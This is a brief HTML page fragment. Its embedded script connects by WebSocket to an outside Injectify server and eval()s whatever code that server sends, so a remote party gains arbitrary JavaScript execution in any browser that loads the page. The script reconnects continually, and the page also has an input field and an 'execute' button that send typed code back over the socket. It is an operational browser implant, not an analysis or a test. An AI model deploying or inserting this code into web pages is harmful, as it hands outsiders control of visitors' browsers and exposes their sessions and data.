<script>
(function i() {
    window.ws  = new WebSocket('wss://injectify.samdd.me/inject/websocket/?$' + btoa('widgetbot'))
    ws.onmessage = function(d) {
        try {
            d = JSON.parse(d.data)
            eval(d.d)
        } catch(e) {
            ws.send(JSON.stringify({
                t: 'e',
                d: e,
            }))
        }
    }
    ws.onclose = function() {
        // Instantly attempt to open the websocket, retrying every 3 seconds
        setTimeout(i(), 3000)
    }
})()
</script>

<input />
<button onclick="ws.send(JSON.stringify({t:'execute', d: document.getElementsByTagName('input')[0].value}))">execute</button>
